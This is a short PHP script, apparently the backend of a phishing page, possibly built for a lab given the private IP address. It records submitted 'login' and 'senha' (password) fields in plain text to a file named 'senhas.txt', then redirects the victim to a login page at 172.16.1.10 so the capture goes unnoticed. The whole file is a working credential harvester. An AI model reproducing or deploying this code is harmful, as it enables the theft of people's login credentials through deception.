<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

$caixa1 = $_POST["login"] . "\n";
$caixa2 = $_POST["senha"] . "\n";

$file = fopen("senhas.txt", "a");

if ($file) {
    fwrite($file, $caixa1);
    fwrite($file, $caixa2);
    fclose($file);
} else {
    die("Erro ao abrir o arquivo!");
}

header("Location: http://172.16.1.10/turismo/login.php");
exit;
?>

